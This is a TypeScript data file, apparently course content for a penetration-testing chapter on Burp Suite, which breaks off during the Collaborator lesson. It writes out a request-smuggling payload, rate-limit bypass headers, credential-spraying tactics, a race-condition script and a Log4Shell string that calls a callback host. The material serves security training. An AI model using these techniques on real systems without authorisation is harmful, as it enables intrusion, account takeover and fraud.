import { RoadmapChapter } from "./types";

export const chapter5: RoadmapChapter = {
  id: "ch-5-burp-suite",
  chapterNumber: 5,
  title: "Burp Suite Pro, Request Tampering & Traffic Interception",
  subtitle: "Proxy Interception, Repeater Precision, Intruder Attack Types & Out-of-Band Collaborator (OAST)",
  badge: "Chapter 5 • Interception Proxy",
  duration: "18 Hours • 6 In-Depth Lessons",
  difficulty: "Intermediate",
  description:
    "Burp Suite Professional is the undisputed industry standard for web application security assessments. Master TLS interception with custom Certificate Authorities, surgical request tampering in Repeater, the four Intruder payload attack types (Sniper, Battering Ram, Pitchfork, Cluster Bomb), high-speed race condition exploitation with Turbo Intruder, and Out-of-Band Application Security Testing (OAST) with Burp Collaborator.",
  iconName: "Wrench",
  lessons: [
    {
      id: "l-5-1",
      lessonNumber: "5.1",
      title: "Burp Suite Architecture, CA Certificates & Proxying",
      duration: "2.5 Hours",
      badge: "Proxy Foundations",
      summary:
        "Configuring Burp Proxy listener, generating and importing the PortSwigger root Certificate Authority (CA) into browsers and mobile devices, and bypassing SSL pinning.",
      studyNotes: [
        {
          heading: "The Man-in-the-Middle (MITM) Interception Model",
          subheading: "How Burp decrypts, inspects, and re-encrypts HTTPS traffic on the fly",
          points: [
            "The Proxy Loop: Burp listens on `127.0.0.1:8080`. When a browser sends an HTTPS request, it establishes a TLS connection with Burp. Burp dynamically generates an SSL certificate for the requested destination domain (e.g., `google.com`), signed by its own PortSwigger CA, and initiates a separate upstream TLS connection with the real web server.",
            "The Untrusted CA Warning: Because PortSwigger is not in the operating system's pre-installed root trust store, browsers display a severe `NET::ERR_CERT_AUTHORITY_INVALID` warning until the `cacert.der` certificate is manually installed and trusted as a Root CA.",
            "Invisible Proxying: Used when intercepting non-proxy-aware client applications (thick clients, mobile apps). Burp acts like an endpoint server, inspecting the Host header to forward traffic upstream.",
            "Target Scope Filtering: Adding target domains to the Burp Suite Target Scope (`Target > Scope`) isolates your testing and prevents your proxy history from being cluttered with background OS telemetry or third-party ad traffic.",
          ],
          callout: "Mobile SSL Pinning: Many modern Android and iOS apps ignore the OS trust store and hardcode (pin) the server's public key inside the APK/IPA. To intercept mobile traffic, you must bypass SSL pinning using Frida scripts (`frida --codeshare ...`) or Objection.",
          diagramOrCode: `+-------------------------------------------------------------+
|               BURP SUITE HTTPS INTERCEPTION MODEL           |
+-------------------------------------------------------------+
 [ Client Browser ]                                 [ Target Web Server ]
         |                                                    |
         v (Leg 1: Encrypted with PortSwigger CA)             |
 [ Burp Proxy (127.0.0.1:8080) ]                              |
         | (Plaintext Inspection & Request Tampering)          |
         v (Leg 2: Encrypted with Target's Real SSL Cert)     |
         +===================================================>+`
        },
        {
          heading: "Scope Isolation & Proxy Configuration Best Practices",
          subheading: "Keeping your assessment clean, compliant, and legally focused",
          points: [
            "Advanced Scope Rules: In `Target > Scope`, enable 'Use advanced scope control'. Use precise regex rules to include `.*\\.target\\.com` and exclude third-party CDNs or out-of-scope analytics domains.",
            "Proxy History Filters: Check 'Show only in-scope items' in the HTTP History filter bar to maintain complete focus on the application under test.",
            "Upstream Proxy Chaining: In corporate environments requiring an egress proxy, configure `Settings > Network > Connections > Upstream Proxy Servers` so Burp forwards its outbound requests through the corporate gateway.",
            "SOCKS Proxying via Burp: Route Burp Suite through an SSH SOCKS tunnel (`127.0.0.1:9050`) to audit internal intranet portals from your local GUI.",
          ],
          callout: "Always set your Target Scope before initiating any automated scanner or intruder attacks! Forgetting to configure scope can result in automated attacks hitting out-of-scope payment processors or third-party SaaS tools, violating bug bounty rules of engagement.",
          diagramOrCode: `BURP PROXY PORT SETUP:
  Listener: 127.0.0.1:8080 (Loopback only)
  Certificate: Generate CA-signed per-host certificates
  Intercept: Turn OFF for passive navigation, ON for live tampering
  History Filter: [x] Show only in-scope items`
        }
      ],
      keyTopics: [
        "The Man-in-the-Middle (MITM) Proxy Architecture: Burp Suite Proxy operates as an intermediate HTTP/HTTPS proxy listening by default on 127.0.0.1:8080. When a browser initiates an HTTPS connection, Burp intercepts the TLS handshake, dynamically generates an on-the-fly SSL certificate signed by its own internal Certificate Authority (PortSwigger CA), and establishes a separate upstream TLS session with the target web server. This allows researchers to view and modify encrypted HTTPS traffic in cleartext.",
        "PortSwigger CA Installation & Trust Store Integration: Because Burp's internal Certificate Authority is not included in standard operating system trust stores, browsers display severe security warnings (NET::ERR_CERT_AUTHORITY_INVALID) when intercepting traffic. To resolve this, researchers download Burp's root certificate (cacert.der) from http://burp and import it directly into their operating system and browser Authorities trust store. Once trusted, all intercepted HTTPS traffic loads seamlessly without warnings.",
        "Target Scope Management & Noise Reduction Rules: Enterprise web testing generates immense amounts of traffic from background operating system services, browser extensions, and third-party advertising analytics. In Burp Suite's Target Scope tab, researchers enable advanced scope control using regular expressions to include only authorized domains (e.g. .*\\.target\\.com). Configuring the Proxy HTTP History filter to 'Show only in-scope items' eliminates background noise and focuses analysis on target routes.",
        "Invisible Proxying & Non-Proxy-Aware Application Interception: Standard web proxies rely on clients explicitly sending HTTP CONNECT requests to establish upstream tunnels. Thick-client applications, mobile apps, and command-line utilities often ignore system proxy settings and send raw TCP packets directly to the destination IP. Enabling 'Invisible Proxying' in Burp allows it to emulate a direct endpoint server, extracting the destination hostname from incoming HTTP Host headers to forward traffic.",
        "Upstream Proxy Chaining & SOCKS5 Routing: In enterprise corporate environments, outbound internet access requires routing through corporate authenticating proxy gateways. Burp Suite's Upstream Proxy settings allow chaining Burp's outbound connections through an external proxy server. Additionally, configuring Burp to route through an SSH SOCKS5 proxy (127.0.0.1:9050) allows researchers to use Burp's visual GUI to test internal corporate portals accessible only through a remote SSH pivot host.",
      ],
      terminalCommands: [
        "curl -x 127.0.0.1:8080 http://burp/cert -o cacert.der",
        "openssl x509 -inform DER -in cacert.der -out cacert.pem",
      ],
      proTips: [
        "Always toggle 'Show only in-scope items' in Burp Proxy history to eliminate noisy OS background telemetry and tracking analytics.",
        "Use FoxyProxy browser extension for 1-click toggling between your direct connection and Burp Suite.",
      ],
    },
    {
      id: "l-5-2",
      lessonNumber: "5.2",
      title: "Burp Repeater Mastery & HTTP Smuggling Probing",
      duration: "3 Hours",
      badge: "Repeater",
      summary:
        "Precision request tampering in Burp Repeater, managing HTTP/1.1 vs HTTP/2 protocol frames, inspecting raw CRLF delimiters, and detecting HTTP Request Smuggling.",
      studyNotes: [
        {
          heading: "Surgical Request Manipulation in Repeater",
          subheading: "The primary laboratory of the web application penetration tester",
          points: [
            "The Power of Repeater: Unlike browsers that automatically sanitize and reformat headers, Repeater gives you absolute byte-level control over every character sent across the TCP socket.",
            "Keyboard Accelerators: `Ctrl+R` sends the current request from Proxy or Target straight into Repeater; `Ctrl+Space` dispatches the request; `Ctrl+Z` undoes text edits.",
            "Manipulating Content-Length: By default, Burp automatically recalculates the `Content-Length` header. To test for buffer overflows or HTTP Request Smuggling, uncheck 'Update Content-Length' to send malformed byte counts.",
            "HTTP/2 vs HTTP/1.1 Downgrade: Burp allows toggling protocols in the top bar. In modern architectures, frontend CDNs speak HTTP/2 while backend servers speak HTTP/1.1, creating the primary breeding ground for H2.CL and H2.TE Request Smuggling.",
          ],
          callout: "When testing for parameter tampering, never assume frontend JavaScript validation reflects backend logic. Changing a hidden form field or JSON attribute in Burp Repeater directly tests the server's raw business logic.",
          diagramOrCode: `+-------------------------------------------------------------+
|               HTTP/1.1 RAW REQUEST STRUCTURE IN REPEATER     |
+-------------------------------------------------------------+
 POST /api/v1/transfer HTTP/1.1\\r\\n          <-- Request Line
 Host: bank.target.com\\r\\n                   <-- Headers
 Authorization: Bearer eyJhbGci...\\r\\n
 Content-Type: application/json\\r\\n
 Content-Length: 38\\r\\n                      <-- Byte count
 \\r\\n                                        <-- Empty Line (CRLF)
 {"account": "attacker", "amount": 100}      <-- Request Body`
        },
        {
          heading: "HTTP Request Smuggling (CL.TE & TE.CL) Foundations",
          subheading: "Exploiting discrepancies between frontend reverse proxies and backend servers",
          points: [
            "The Dual-Header Dilemma: When an HTTP request contains both `Content-Length` (CL) and `Transfer-Encoding: chunked` (TE), RFC standards state `Transfer-Encoding` takes precedence. However, buggy servers disagree on which header to follow.",
            "CL.TE Desync: Frontend uses `Content-Length`, backend uses `Transfer-Encoding`. An attacker specifies a large `Content-Length` and a small chunk size, causing the backend to leave the remainder of the request sitting in the socket buffer.",
            "TE.CL Desync: Frontend uses `Transfer-Encoding`, backend uses `Content-Length`. The frontend forwards the entire chunked body, but the backend reads only the specified byte count, interpreting the remaining bytes as the beginning of the *next* user's request!",
            "Impact: Poisoning the shared HTTP connection pool, stealing session cookies of random users, and bypassing frontend WAF security restrictions.",
          ],
          callout: "Burp Repeater displays CRLF (`\\r\\n`) characters explicitly when you toggle the '\\n' icon. Precise byte counts and chunk headers (`0\\r\\n\\r\\n`) are mandatory to reproduce HTTP Request Smuggling successfully.",
          diagramOrCode: `CL.TE REQUEST SMUGGLING PAYLOAD:
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED-PREFIX: GET /admin HTTP/1.1
Host: target.com`
        }
      ],
      keyTopics: [
        "Surgical Request Tampering in Burp Repeater: Burp Repeater is the primary manual testing workshop for security researchers, providing byte-level control over raw HTTP requests. Unlike web browsers that automatically sanitize and rewrite malformed headers, Repeater transmits exactly the raw characters specified by the user. Pressing 'Ctrl+R' sends requests from Proxy history to Repeater, and 'Ctrl+Space' dispatches the modified request, allowing rapid experimentation with parameter tampering.",
        "Content-Length Management & Byte Count Manipulation: By default, Burp Repeater automatically calculates and updates the 'Content-Length' header to match the exact byte size of the request body. When testing for buffer overflows, HTTP Request Smuggling, or backend parser anomalies, unchecking 'Update Content-Length' allows sending malformed byte counts. If Content-Length is shorter than the actual body, the backend server leaves the trailing bytes buffered on the socket.",
        "HTTP/2 Cleartext & Protocol Downgrade Vulnerabilities: Modern frontend CDNs (Cloudflare, Akamai) communicate with clients over binary HTTP/2 frames, but frequently downgrade traffic to HTTP/1.1 when forwarding requests to backend origin servers. This protocol downgrade introduces severe security discrepancies in how header lengths and chunked encodings are interpreted. Repeater allows toggling between HTTP/1.1 and HTTP/2 protocols to identify desynchronization flaws between tiers.",
        "HTTP Request Smuggling (CL.TE & TE.CL) Desync Theory: HTTP Request Smuggling occurs when frontend reverse proxies and backend servers disagree on how to determine the boundaries of an HTTP request. In a CL.TE desynchronization, the frontend uses the Content-Length header while the backend uses Transfer-Encoding: chunked. An attacker crafts a request with both headers, causing the backend to process only the first chunk and leaving the remaining payload buffered in the shared TCP connection.",
        "Connection Pool Poisoning & Cross-User Request Hijacking: When an HTTP Request Smuggling payload is successfully buffered on a persistent backend TCP socket, it prepends itself to the NEXT request transmitted on that shared connection. When an innocent victim submits an HTTP request to the website seconds later, their request is appended directly to the attacker's smuggled payload. This allows the attacker to steal the victim's session cookies, redirect their traffic, or execute unauthorized actions.",
      ],
      terminalCommands: [
        "# Testing HTTP/2 support via cURL:",
        "curl -I --http2 https://target.com",
      ],
      proTips: [
        "Use Repeater tab groups (color-coded) to organize complex multi-stage vulnerability chains (e.g. CSRF token extraction -> password reset -> authentication).",
        "Click the '\\n' icon in Repeater to view non-printable whitespace characters; invisible trailing spaces often break smuggling payloads.",
      ],
    },
    {
      id: "l-5-3",
      lessonNumber: "5.3",
      title: "Burp Intruder Attack Types & Bypassing Rate Limits",
      duration: "3 Hours",
      badge: "Intruder",
      summary:
        "Executing brute-force and fuzzing attacks using the four Intruder payload attack types: Sniper, Battering Ram, Pitchfork, and Cluster Bomb, while evading rate limits.",
      studyNotes: [
        {
          heading: "The Four Burp Intruder Attack Modes Explained",
          subheading: "Choosing the optimal payload distribution strategy for your target scenario",
          points: [
            "Sniper (Single Payload Set, Sequential Positions): Cycles through each marked position one by one using a single dictionary. Ideal for fuzzing input fields for XSS/SQLi or brute-forcing a known username's password.",
            "Battering Ram (Single Payload Set, Simultaneous Insertion): Inserts the exact same word into all marked positions simultaneously. Useful when a form requires matching fields (e.g. `password` and `confirm_password`).",
            "Pitchfork (Multiple Payload Sets, Lockstep Traversal): Uses multiple dictionaries (e.g. list of usernames and list of passwords), traversing them simultaneously in parallel (`user1:pass1`, `user2:pass2`). Perfect for testing credential stuffing lists.",
            "Cluster Bomb (Multiple Payload Sets, Permutation Matrix): Tests every possible combination across multiple dictionaries (`N x M` matrix). If List 1 has 100 usernames and List 2 has 100 passwords, Cluster Bomb sends 10,000 requests.",
          ],
          callout: "Intruder Throttling in Community Edition: Burp Suite Community intentionally throttles Intruder requests to 1 request per second. In professional engagements, Burp Suite Pro removes this throttle, and the Turbo Intruder extension achieves speeds of over 2,000 requests per second.",
          diagramOrCode: `+-------------------------------------------------------------+
|               BURP INTRUDER ATTACK TYPES MATRIX             |
+-------------------------------------------------------------+
 1. SNIPER:
    Req 1: user=§admin§ & pass=test
    Req 2: user=§guest§ & pass=test
 
 2. BATTERING RAM:
    Req 1: user=§admin§ & pass=§admin§
    Req 2: user=§guest§ & pass=§guest§
 
 3. PITCHFORK (Parallel Sets):
    Req 1: user=§admin§ & pass=§Password123§
    Req 2: user=§root§  & pass=§toor§
 
 4. CLUSTER BOMB (Full Combinatorial Cross-Product):
    Req 1: user=§admin§ & pass=§Password123§
    Req 2: user=§admin§ & pass=§toor§
    Req 3: user=§root§  & pass=§Password123§
    Req 4: user=§root§  & pass=§toor§`
        },
        {
          heading: "Bypassing WAF Rate Limiting & Account Lockouts",
          subheading: "Tactics for maintaining brute-force velocity without getting IP banned",
          points: [
            "IP Header Spoofing: Many poorly configured rate limiters inspect client-supplied headers rather than the TCP socket IP. Adding random headers (`X-Forwarded-For: §IP§`, `X-Real-IP`, `Client-IP`, `X-Originating-IP`) resets the rate-limit counter on each request.",
            "Credential Spraying Strategy: Rather than testing 10,000 passwords against 1 user (which triggers account lockout), test 1 common password (e.g. `Spring2026!`) against 10,000 different usernames.",
            "Response Gripping & Extractors: Configure `Options > Grep - Extract` to automatically extract CSRF tokens from the previous response and feed them dynamically into the next request.",
            "Sorting by Anomaly: In the results window, sort by `Status Code`, `Length`, or `Response Received Time` to pinpoint successful logins immediately.",
          ],
          callout: "Always configure `Grep - Match` for error strings like 'Invalid password' or 'Account locked'. Sorting by this custom column highlights any response that *lacks* the error string, signaling a successful bypass!",
          diagramOrCode: `COMMON RATE LIMIT BYPASS HEADERS:
  X-Forwarded-For: 127.0.0.1
  X-Forwarded-Host: 127.0.0.1
  X-Client-IP: 127.0.0.1
  X-Real-IP: 127.0.0.1
  X-Remote-IP: 127.0.0.1
  True-Client-IP: 127.0.0.1`
        }
      ],
      keyTopics: [
        "Burp Intruder Attack Modes (Sniper, Battering Ram, Pitchfork, Cluster Bomb): Sniper cycles through each marked payload position sequentially using a single dictionary, ideal for fuzzing parameters for XSS or SQLi. Battering Ram inserts the exact same word into all marked positions simultaneously. Pitchfork iterates through multiple dictionaries in lockstep parallel (User1:Pass1, User2:Pass2), perfect for credential stuffing lists. Cluster Bomb tests every combinatorial permutation across multiple lists (N x M), ideal for brute-forcing unknown usernames and passwords.",
        "Payload Processing Rules & Dynamic Encoding: Burp Intruder supports multi-stage payload processing rules that transform dictionary words before transmission. Rules include prefixing/suffixing characters, hashing values (MD5, SHA-256), Base64 encoding, and URL encoding. Configuring payload processing rules allows testing complex authentication schemes (like Basic Auth where usernames and passwords must be concatenated and Base64-encoded as 'user:pass').",
        "Grep - Match & Grep - Extract for Automated Token Parsing: The 'Grep - Match' feature flags responses containing specific success or failure strings (such as 'Invalid password' or 'Welcome Admin'), creating sortable columns in the results table. The 'Grep - Extract' feature uses regex or visual selection to automatically parse dynamic anti-CSRF tokens from an HTTP response, feeding them dynamically into the subsequent Intruder request to bypass CSRF token validation during brute-force attacks.",
        "WAF Rate Limit Evasion via Header Spoofing: Application rate limiters and Web Application Firewalls frequently track client request velocity using client-supplied HTTP headers rather than the physical TCP socket IP address. Injecting randomized IP addresses into headers like 'X-Forwarded-For: \u00a7IP\u00a7', 'X-Real-IP', or 'Client-IP' across Intruder requests resets the rate-limiting counter on each attempt. This allows high-velocity brute-force attacks to continue without triggering temporary IP bans.",
        "Credential Spraying Methodology: Traditional brute-force attacks test thousands of passwords against a single target user account, which inevitably triggers account lockout policies after 3 to 5 failed attempts. Credential Spraying flips this paradigm by testing a single common password (e.g. 'Winter2025!') against thousands of different corporate usernames. This remains below individual account lockout thresholds while virtually guaranteeing access to multiple accounts across large organizations.",
      ],
      terminalCommands: [
        "# Verify rate limiting behavior using cURL loop:",
        "for i in {1..20}; do curl -s -o /dev/null -w \"%{http_code}\\n\" https://target.com/login; done",
      ],
      proTips: [
        "In Intruder, use 'Grep - Extract' to automatically parse dynamic CSRF tokens from responses and feed them into the next request.",
        "When brute-forcing login forms, sort by 'Length' rather than 'Status Code'; a successful login often returns HTTP 200 with a slightly different byte size.",
      ],
    },
    {
      id: "l-5-4",
      lessonNumber: "5.4",
      title: "Match and Replace Rules & Custom Headers",
      duration: "2.5 Hours",
      badge: "Automation Rules",
      summary:
        "Automating request and response modification on the fly: injecting authentication tokens, spoofing IP headers, stripping security headers, and bypassing client-side restrictions.",
      studyNotes: [
        {
          heading: "How Match and Replace Rules Operate",
          subheading: "Streamlining complex assessments through automated proxy manipulation",
          points: [
            "What is Match and Replace? A configuration section inside `Proxy > Options` that automatically finds specific regex patterns or headers in passing traffic and replaces them before the request hits the network or before the response hits the browser.",
            "Injecting Persistent Headers: Add an `X-Forwarded-For: 127.0.0.1` rule to every outgoing request to test for IP whitelisting bypasses across an entire web application automatically.",
            "Spoofing User-Agents: Automatically replace modern mobile User-Agents with legacy browser strings or search engine bot strings (`Googlebot/2.1`) to inspect hidden server behaviors.",
            "Stripping Content-Security-Policy (CSP): Instruct Burp to delete `Content-Security-Policy` and `X-Frame-Options` response headers in real time, making it significantly easier to test DOM-based XSS and clickjacking in your browser without browser security interference.",
          ],
          callout: "The Authorization Swapping Trick: Create a Match and Replace rule that replaces User A's session cookie with User B's session cookie. Then browse the application as User A. Any page that loads successfully is an immediate Broken Object Level Authorization (BOLA / IDOR) vulnerability!",
          diagramOrCode: `+-------------------------------------------------------------+
|               MATCH AND REPLACE PROXY TRANSFORMATION        |
+-------------------------------------------------------------+
 Browser sends:
   GET /dashboard HTTP/1.1
   Host: target.com
   Cookie: session=USER_A_TOKEN
               |
               v [ Burp Match & Replace Rule: USER_A -> USER_B ]
 Burp transmits to server:
   GET /dashboard HTTP/1.1
   Host: target.com
   Cookie: session=USER_B_TOKEN  <-- Injected automatically!
               |
 Server responds with HTTP 200 ==> Instant IDOR / BOLA Discovery!`
        },
        {
          heading: "Bypassing Client-Side Form Validations",
          subheading: "Disabling frontend HTML5 restrictions and disabled buttons",
          points: [
            "Unhiding Hidden Form Fields: Configure Match and Replace to find `type=\"hidden\"` and replace it with `type=\"text\"`, instantly making all hidden form fields visible and editable in your browser window.",
            "Enabling Disabled Buttons: Replace `disabled` with an empty string in HTML responses so client-side blocked buttons can be clicked.",
            "Removing Input Length Limits: Replace `maxlength=\"[0-9]+\"` with `maxlength=\"99999\"` to send huge payloads without opening developer tools.",
            "Automated JWT Insertion: Automatically append an `Authorization: Bearer <token>` header to all outgoing API endpoints during manual testing.",
          ],
          callout: "Match and Replace rules run on EVERY request that passes through Burp Proxy. Remember to disable rules after your test to prevent unexpected side effects on your general web browsing.",
          diagramOrCode: `USEFUL MATCH AND REPLACE RULES:
  1. Emulate Internal IP:
     Type: Request header | Match: (empty) | Replace: X-Forwarded-For: 127.0.0.1
  
  2. Emulate Admin Role:
     Type: Request header | Match: Role: user | Replace: Role: admin
  
  3. Strip CSP Headers:
     Type: Response header | Match: Content-Security-Policy: .* | Replace: (empty)
  
  4. Make Hidden Fields Visible:
     Type: Response body | Match: type="hidden" | Replace: type="text"`
        }
      ],
      keyTopics: [
        "Proxy Match and Replace Rules Architecture: Match and Replace rules (located in Proxy > Settings) execute automated, regex-based string replacements on all HTTP requests and responses passing through Burp Proxy. Rules execute silently in the background before requests hit the network wire or before responses are rendered in the browser. This allows penetration testers to automate repetitive testing modifications across their entire browsing session.",
        "Automated Header Injection (X-Forwarded-For, Role Spoofing): Researchers configure Match and Replace rules to automatically inject custom headers into every outgoing request. Adding 'X-Forwarded-For: 127.0.0.1' tests for IP-based administrative whitelisting bypasses across all visited endpoints. Adding 'X-Debug-Mode: 1' or custom internal API tokens allows auditing how backend services react to elevated internal operational flags without manual Repeater intervention.",
        "Stripping Browser Security Headers (CSP, X-Frame-Options): Testing for Client-Side vulnerabilities like DOM XSS and Clickjacking in a real browser is frequently blocked by modern security headers. A Match and Replace rule can automatically strip 'Content-Security-Policy', 'X-Frame-Options', and 'Strict-Transport-Security' from incoming HTTP response headers. This allows researchers to quickly verify whether an XSS or framing payload executes in the DOM without browser security interference.",
        "Automated Authorization Testing via Cookie Swapping: A classic authorization testing workflow involves configuring a Match and Replace rule that replaces User A's session cookie with User B's session cookie. The researcher then browses the application as User A. If any pages load private data or execute state-changing actions successfully, an immediate Insecure Direct Object Reference (IDOR) or Broken Object Level Authorization (BOLA) vulnerability is verified.",
        "Unhiding Hidden Form Fields & Disabling Client Validations: Match and Replace rules can modify response HTML bodies before they reach the browser engine. Replacing 'type=\"hidden\"' with 'type=\"text\"' makes all hidden form fields visible and editable directly in the webpage. Replacing 'disabled' or 'maxlength=\"[0-9]+\"' with empty strings bypasses client-side HTML5 form restrictions, allowing researchers to submit arbitrary inputs directly through standard browser UI forms.",
      ],
      terminalCommands: [
        "# Verify injected headers using local Netcat listener:",
        "nc -lvnp 9999",
      ],
      proTips: [
        "Create a rule that replaces your session cookie with an unauthenticated value; any API endpoint that returns 200 has broken authentication!",
        "Strip `Content-Security-Policy` and `X-Frame-Options` headers in responses to quickly verify Clickjacking and XSS feasibility in your browser.",
      ],
    },
    {
      id: "l-5-5",
      lessonNumber: "5.5",
      title: "Burp Extensions (BApp Store): Autorize, Turbo Intruder & Logger++",
      duration: "3.5 Hours",
      badge: "Extensions",
      summary:
        "Supercharging Burp Suite with top BApp extensions: automated privilege escalation testing with Autorize, lightning-fast race condition exploitation with Turbo Intruder, and advanced traffic querying with Logger++.",
      studyNotes: [
        {
          heading: "Autorize: The Holy Grail of IDOR & Broken Access Control",
          subheading: "Automating horizontal and vertical authorization checks on every clicked link",
          points: [
            "Why Manual IDOR Testing is Exhausting: Testing an application with 500 endpoints for access control requires logging in as User A, saving the URL, logging out, logging in as User B, and requesting the URL again for every single feature.",
            "How Autorize Automates Authorization: You provide Autorize with User B's low-privilege session cookie. You then browse the entire web application as User A (Administrator). For every single request your browser makes, Autorize silently clones the request, swaps in User B's cookie, sends it in the background, and compares the response length and status code.",
            "Status Indicators: Green (Enforced - User B received 401/403 or different response), Red (Bypassed! - User B received identical 200 response; severe IDOR!), Orange (Needs manual inspection).",
            "Unauthenticated Checks: Autorize simultaneously sends a third request with *no* cookies to detect endpoints completely missing authentication.",
          ],
          callout: "Autorize is responsible for more high-paying bug bounty reports than almost any other extension. Simply leaving Autorize running in the background while performing standard functional testing will flag IDORs you would otherwise never have noticed.",
          diagramOrCode: `+-------------------------------------------------------------+
|               AUTORIZE EXTENSION WORKFLOW                   |
+-------------------------------------------------------------+
 You browse as User A (Admin):
   GET /admin/users/delete?id=45 (Cookie: Admin_Token)
        |
        v
 [ AUTORIZE INTERCEPTS REQUEST ]
   ├── Replays request with User B (Low-Priv) Token
   └── Replays request with NO Token (Unauthenticated)
        |
        v
 RESULTS TABLE:
   User B Status:       [ 200 OK ]  ==> RED: VULNERABLE (IDOR)!
   No Token Status:     [ 200 OK ]  ==> RED: BROKEN AUTHENTICATION!`
        },
        {
          heading: "Turbo Intruder & Race Condition Exploitation",
          subheading: "Executing 2,000+ requests per second using raw C-based Python sockets",
          points: [
            "Why Standard Intruder Fails for Race Conditions: Standard Intruder is written in Java and uses standard thread pools, introducing slight microsecond jitters between requests that allow target databases to serialize transactions.",
            "Turbo Intruder Architecture: Written by James Kettle (PortSwigger Research), Turbo Intruder uses a custom, highly optimized HTTP stack written in C (`kl-http`) coupled with a Python scripting engine. It can send thousands of requests within a single millisecond window.",
            "The Single-Packet Attack: Turbo Intruder prepares 20 identical requests, sends all headers across 20 connections, and holds back the final byte of each request. It then sends all 20 final bytes within a single TCP packet, forcing the backend database to execute them in exact parallel!",
            "Logger++ Power Filtering: Replaces the default Burp logger with an advanced multi-tab SQL-like querying interface that logs every request made by all extensions.",
          ],
          callout: "Use Turbo Intruder to exploit financial race conditions: applying a 10% coupon code 20 times simultaneously, transferring $100 to two accounts at the exact same millisecond, or redeeming a gift card multiple times before the database sets the `is_redeemed` flag.",
          diagramOrCode: `TURBO INTRUDER SINGLE-PACKET ATTACK SCRIPT:
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=30)
    
    # Queue 30 requests holding back the final byte:
    for i in range(30):
        engine.queue(target.req, gate='race_gate')
    
    # Open the gate to release all 30 requests simultaneously!
    engine.openGate('race_gate')

def handleResponse(req, interesting):
    table.add(req)`
        }
      ],
      keyTopics: [
        "Autorize: Automated Authorization & IDOR Auditing: Autorize is an industry-standard Burp extension that automates the detection of Broken Access Control and IDOR vulnerabilities. The researcher configures Autorize with a low-privilege user session cookie, then browses the web application as a high-privilege Administrator. For every request the browser makes, Autorize replays the request in the background using the low-privilege cookie and a third time with zero cookies, comparing response lengths to detect bypasses.",
        "Turbo Intruder: High-Speed Race Condition Exploitation: Written by PortSwigger Research, Turbo Intruder utilizes a custom, hyper-optimized HTTP stack written in C (kl-http) coupled with a Python scripting engine. Capable of transmitting over 2,000 requests per second, Turbo Intruder can execute the 'single-packet attack': preparing dozens of identical requests and releasing their final bytes simultaneously within a single TCP packet. This forces databases to process transactions in exact parallel, exploiting race conditions in financial checkouts and coupon redemptions.",
        "Logger++: Multi-Tab SQL-Like Traffic Querying: The default Burp Suite HTTP history log lacks advanced filtering capabilities for multi-threaded extension traffic. Logger++ records every single request and response generated by Burp Proxy, Scanner, Intruder, and all installed extensions into a unified, high-performance database. Researchers use SQL-like filter queries and regular expressions to search for specific headers, response lengths, and error patterns across historical session logs.",
        "JSON Web Tokens (JWT) Extension Tools: The JWT Editor extension integrates cryptographic manipulation tools directly into Burp Suite. It automatically decodes JWTs in passing traffic, highlights algorithm fields, and provides one-click attacks for testing the 'none' algorithm bypass. The extension also manages local RSA/HMAC key stores, allowing researchers to execute RS256-to-HS256 key confusion attacks and resign tampered tokens effortlessly.",
        "Software Vulnerability Discovery with Software Vulnerability Scanner: This extension passively inspects HTTP response headers, script paths, and error traces to identify running software versions (e.g. Apache, PHP, jQuery, WordPress plugins). It automatically cross-references detected versions against the Vulners database, flagging outdated components that have public CVE exploits. This automates component-level vulnerability analysis during initial passive application mapping.",
      ],
      terminalCommands: [
        "# Verifying Turbo Intruder installation requirements:",
        "java -version",
      ],
      proTips: [
        "Leave Autorize running constantly in the background with a low-privilege user cookie; it passively identifies IDORs while you browse naturally.",
        "Use Turbo Intruder's 'race.py' template for coupon code duplication, gift card redemption, and limited-stock checkout flaws.",
      ],
    },
    {
      id: "l-5-6",
      lessonNumber: "5.6",
      title: "Collaborator: Out-of-Band (OAST) Vulnerability Detection",
      duration: "3 Hours",
      badge: "OAST Detection",
      summary:
        "Detecting blind, asynchronous vulnerabilities (Blind SSRF, Blind SQLi, Blind XSS, and Log4Shell) using Burp Collaborator's dedicated DNS, HTTP, and SMTP listener servers.",
      studyNotes: [
        {
          heading: "Why Out-of-Band (OAST) Testing is Necessary",
          subheading: "Discovering vulnerabilities that return zero feedback in HTTP responses",
          points: [
            "The Blind Vulnerability Dilemma: Many web vulnerabilities never reflect in the HTTP response. For instance, when a server receives an image URL, downloads it in a background worker queue 5 minutes later, and renders a thumbnail, standard scanners see only an immediate `200 OK` and conclude the server is secure.",
            "What is Burp Collaborator? An independent server running custom DNS, HTTP, and SMTP daemons. Burp Suite generates unique, random subdomains (e.g. `xyz123.oastify.com`).",
            "The OAST Trigger: You inject this unique Collaborator subdomain into target inputs (e.g., `avatar_url=http://xyz123.oastify.com`). When the backend server processes the input, it initiates a DNS lookup or HTTP GET request to PortSwigger's Collaborator server.",
            "The Confirmation Loop: Burp Suite periodically polls Collaborator over an encrypted channel. When Collaborator confirms receiving a DNS query from the target server's internal IP address, you receive definitive proof of an Out-of-Band vulnerability!",
          ],
          callout: "Burp Collaborator is the only reliable way to detect modern Remote Code Execution (RCE) flaws like Log4Shell (`${jndi:ldap://xyz.oastify.com/a}`) or Blind SSRF in cloud metadata APIs.",
          diagramOrCode: `+-------------------------------------------------------------+
|               BURP COLLABORATOR OUT-OF-BAND (OAST) FLOW     |
+-------------------------------------------------------------+
 Attacker (Burp) injects payload:
   POST /webhook HTTP/1.1
   {"url": "http://burpcollaborator.net/test"}
        |
        v
 Target Web Server processes input in background
        |
        v (Initiates internal DNS / HTTP connection)
 [ Burp Collaborator Server ] <==== Receives DNS query from Target IP!
        ^
        | (Burp polls Collaborator: "Did anyone ping my unique token?")
        |
 Attacker receives instant alert: "BLIND SSRF CONFIRMED from 10.10.20.5!"`
        },
        {
          heading: "Private Collaborator Deployment & DNS Exfiltration",
          subheading: "Running dedicated listener infrastructure for enterprise penetration tests",
          points: [
            "Corporate Egress Restrictions: Many hardened enterprise networks block outbound connections to known public domains like `*.oastify.com` or `*.burpcollaborator.net`.",
            "Deploying Private Collaborator: In high-security client engagements, spin up an AWS EC2 instance with custom NS records pointing to your own private domain, ensuring unblocked egress traffic.",
